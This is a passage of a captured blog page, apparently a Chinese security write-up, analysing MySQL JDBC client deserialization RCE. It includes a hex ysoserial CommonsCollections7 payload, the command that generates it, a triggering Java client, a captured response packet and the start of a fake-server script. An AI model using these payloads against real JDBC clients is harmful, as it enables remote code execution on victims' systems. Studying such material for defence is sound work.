socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\"start fake mysql server listening on {}:{}\".format(HOST,PORT)) run() 诚然，这种方法是没有上一个脚本来得自动化的，但是比较方便复现。\n",
+  "wordCount" : "815",
+  "inLanguage": "en",
+  "datePublished": "2021-10-15T21:46:28Z",
+  "dateModified": "2021-10-15T21:46:28Z",
+  "author":{
+    "@type": "Person",
+    "name": "ch4ser"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://dragonbox.top/posts/sec-jdbc-unserialize/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ch4ser の 超元域",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://dragonbox.top/flash.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="https://dragonbox.top/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://dragonbox.top/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://dragonbox.top/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="https://dragonbox.top/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      mysql jdbc反序列化的不深入研究
+    </h1>
+    <div class="post-meta"><span title='2021-10-15 21:46:28 +0000 UTC'>October 15, 2021</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;815 words&nbsp;·&nbsp;ch4ser
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#漏洞利用">漏洞利用</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p>我终于更新博客了……</p></blockquote>
+<h2 id="漏洞原理">漏洞原理<a hidden class="anchor" aria-hidden="true" href="#漏洞原理">#</a></h2>
+<p>当jdbc客户端连接到远程mysql服务器的时候，双方在连接过程中会进行一些数据交换并执行一些查询语句，比如<code>SHOW SESSION STATUS</code>，在使用特定构造的jdbc链接去连接mysql服务器时，<code>SHOW SESSION STATUS</code>的返回数据会在客户端进行反序列化进而触发RCE代码。</p>
+<p>根据 <a href="http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a> 中的描述，可以通过以下方式手动触发反序列化，注意这不是在触发jdbc反序列化漏洞，但是在后面利用的时候有用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">DATABASE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">EXISTS</span> test;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">EXISTS</span> test.eviltable
+</span></span><span style="display:flex;"><span>(
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">`</span>id<span style="color:#f92672">`</span> int(<span style="color:#ae81ff">11</span>) unsigned <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT,
+</span></span><span style="display:flex;"><span>	evil  blob,
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (<span style="color:#f92672">`</span>id<span style="color:#f92672">`</span>)
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> <span style="color:#f92672">@</span>obj<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> test.eviltable(<span style="color:#f92672">`</span>evil_2<span style="color:#f92672">`</span>) <span style="color:#66d9ef">VALUES</span> (<span style="color:#f92672">@</span>obj);
+</span></span></code></pre></div><p>该数据是由执行以下命令生成的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>java8 -jar ysoserial.jar CommonsCollections7 <span style="color:#e6db74">&#34;touch /tmp/cc7&#34;</span> | xxd -ps -c <span style="color:#ae81ff">200</span> | tr -d <span style="color:#e6db74">&#39;\n&#39;</span> 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.Connection;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.DriverManager;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.PreparedStatement;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.ResultSet;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">main</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.mysql.cj.jdbc.Driver&#34;</span>);
+</span></span><span style="display:flex;"><span>        String jdbc_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:mysql://192.168.31.119:3306/test?&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;autoDeserialize=true&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span>;
+</span></span><span style="display:flex;"><span>        Connection con <span style="color:#f92672">=</span> DriverManager.<span style="color:#a6e22e">getConnection</span>(jdbc_url,<span style="color:#e6db74">&#34;xxxx&#34;</span>,<span style="color:#e6db74">&#34;toor&#34;</span>);
+</span></span><span style="display:flex;"><span>        PreparedStatement ptmt <span style="color:#f92672">=</span> con.<span style="color:#a6e22e">prepareStatement</span>(<span style="color:#e6db74">&#34;select evil from eviltable ;&#34;</span>);
+</span></span><span style="display:flex;"><span>        ResultSet rs <span style="color:#f92672">=</span> ptmt.<span style="color:#a6e22e">executeQuery</span>();
+</span></span><span style="display:flex;"><span>        rs.<span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>        rs.<span style="color:#a6e22e">getObject</span>(1);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>启动wireshark进行抓包，设置过滤规则<code>mysql</code></p>
+<p><img alt="image-20211015221453492" loading="lazy" src="/posts/sec-jdbc-unserialize/image-20211015221453492.png"></p>
+<p>图中选中的数据包就是执行<code>select evil from eviltable ;</code>后返回的数据，也就是刚才生成的数据。将其复制出来，并删除mysql之外的数据，得到如下数据</p>
+<pre tabindex="0"><code>01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000
+</code></pre><p>该数据在jdbc端被反序列化后触发了漏洞。</p>
+<p>这只是普通的反序列化，要在jdbc连接的过程中触发反序列化，首先来看<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ServerStatusDiffInterceptor</span> <span style="color:#66d9ef">implements</span> QueryInterceptor {
+</span></span><span style="display:flex;"><span>	...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#f92672">&lt;</span>T <span style="color:#66d9ef">extends</span> Resultset<span style="color:#f92672">&gt;</span> T <span style="color:#a6e22e">postProcess</span>(Supplier<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> sql, Query interceptedQuery, T originalResultSet, ServerSession serverSession) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">populateMapWithSessionStatusValues</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">postExecuteValues</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">logInfo</span>(<span style="color:#e6db74">&#34;Server status change for query:\n&#34;</span> <span style="color:#f92672">+</span> Util.<span style="color:#a6e22e">calculateDifferences</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">preExecuteValues</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">postExecuteValues</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">populateMapWithSessionStatusValues</span>(Map<span style="color:#f92672">&lt;</span>String, String<span style="color:#f92672">&gt;</span> toPopulate) {
+</span></span><span style="display:flex;"><span>            Statement stmt <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            ResultSet rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                    toPopulate.<span style="color:#a6e22e">clear</span>();
+</span></span><span style="display:flex;"><span>                    stmt <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">createStatement</span>();
+</span></span><span style="display:flex;"><span>                    rs <span style="color:#f92672">=</span> stmt.<span style="color:#a6e22e">executeQuery</span>(<span style="color:#e6db74">&#34;SHOW SESSION STATUS&#34;</span>);
+</span></span><span style="display:flex;"><span>                    ResultSetUtil.<span style="color:#a6e22e">resultSetToMap</span>(toPopulate, rs);
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (rs <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                        rs.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (stmt <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                        stmt.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (SQLException var8) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> ExceptionFactory.<span style="color:#a6e22e">createException</span>(var8.<span style="color:#a6e22e">getMessage</span>(), var8);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>ServerStatusDiffInterceptor</code>是一个实现了<code>QueryInterceptor</code>接口的拦截器，当<code>queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>的时候就会经过这个拦截器，并调用这个拦截器的<code>preProcess</code>方法和 <code>postProcess</code>方法。</p>
+<p>可以看到<code>SHOW SESSION STATUS</code>语句请求的结果进入了 <code>com.mysql.cj.jdbc.util.ResultSetUtil</code> 的 <code>resultSetToMap</code>方法中。跟进看看</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResultSetUtil</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ResultSetUtil</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">resultSetToMap</span>(Map mappedValues, ResultSet rs) <span style="color:#66d9ef">throws</span> SQLException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(rs.<span style="color:#a6e22e">next</span>()) {
+</span></span><span style="display:flex;"><span>            mappedValues.<span style="color:#a6e22e">put</span>(rs.<span style="color:#a6e22e">getObject</span>(1), rs.<span style="color:#a6e22e">getObject</span>(2));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>调用了 <code>com.mysql.cj.jdbc.result.ResultSetImpl</code>的<code>getObject</code>方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">int</span> columnIndex) <span style="color:#66d9ef">throws</span> SQLException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">checkRowPos</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">checkColumnBounds</span>(columnIndex);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> columnIndexMinusOne <span style="color:#f92672">=</span> columnIndex <span style="color:#f92672">-</span> 1;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisRow</span>.<span style="color:#a6e22e">getNull</span>(columnIndexMinusOne)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                Field field <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">columnDefinition</span>.<span style="color:#a6e22e">getFields</span>()<span style="color:#f92672">[</span>columnIndexMinusOne<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">switch</span>(field.<span style="color:#a6e22e">getMysqlType</span>()) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> BIT:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>field.<span style="color:#a6e22e">isBinary</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>field.<span style="color:#a6e22e">isBlob</span>()) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> field.<span style="color:#a6e22e">isSingleBit</span>() <span style="color:#f92672">?</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getBoolean</span>(columnIndex) : <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getBytes</span>(columnIndex);
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getBytes</span>(columnIndex);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(Boolean)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">getPropertySet</span>().<span style="color:#a6e22e">getBooleanProperty</span>(<span style="color:#e6db74">&#34;autoDeserialize&#34;</span>).<span style="color:#a6e22e">getValue</span>()) {
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">return</span> data;
+</span></span><span style="display:flex;"><span>                        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                            Object obj <span style="color:#f92672">=</span> data;
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> (data <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> data.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;=</span> 2) {
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">if</span> (data<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>84 <span style="color:#f92672">||</span> data<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>19) {
+</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getString</span>(columnIndex);
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                                    ByteArrayInputStream bytesIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(data);
+</span></span><span style="display:flex;"><span>                                    ObjectInputStream objIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bytesIn);
+</span></span><span style="display:flex;"><span>                                    obj <span style="color:#f92672">=</span> objIn.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>                                    objIn.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>                                    bytesIn.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>                                } <span style="color:#66d9ef">catch</span> (ClassNotFoundException var13) {
+</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">throw</span> SQLError.<span style="color:#a6e22e">createSQLException</span>(Messages.<span style="color:#a6e22e">getString</span>(<span style="color:#e6db74">&#34;ResultSet.Class_not_found___91&#34;</span>) <span style="color:#f92672">+</span> var13.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> Messages.<span style="color:#a6e22e">getString</span>(<span style="color:#e6db74">&#34;ResultSet._while_reading_serialized_object_92&#34;</span>), <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getExceptionInterceptor</span>());
+</span></span><span style="display:flex;"><span>                                } <span style="color:#66d9ef">catch</span> (IOException var14) {
+</span></span><span style="display:flex;"><span>                                    obj <span style="color:#f92672">=</span> data;
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>                            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">return</span> obj;
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>              ...
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>这里进行了一个判断，在<code>autoDeserialize=true</code>的情况下会对数据进行反序列化。</p>
+<p>那么链条就会比较清晰了，接下来是怎么伪造一个mysql服务端来和jdbc客户端进行数据交互，并在客户端发送<code>SHOW SESSION STATUS</code>的时候将payload发送给客户端触发反序列化漏洞。这里通过观察wireshark数据包简单分析一下</p>
+<p><img alt="image-20211015225145865" loading="lazy" src="/posts/sec-jdbc-unserialize/image-20211015225145865.png"></p>
+<p>首先是<code>greeting</code>，然后jdbc发送登陆请求，服务端返回<code>Response OK</code>数据，这个<code>Response OK</code>在后面的数据交互中多次用到，需要我们伪造的mysql服务端用来进行数据返回。在经过一些数据协商后，来到<code>SHOW SESSION STATUS</code>部分，我们伪造的mysql服务端就可以发送真正的payload给jdbc客户端来进行反序列化了。</p>
+<h2 id="漏洞利用">漏洞利用<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h2>
+<p>这里直接拿别的师傅的脚本，从https://xz.aliyun.com/t/8159#toc-1 这里拿的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># -*- coding:utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#@Time : 2020/7/27 2:10</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#@Author: Tri0mphe7</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#@File : server.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
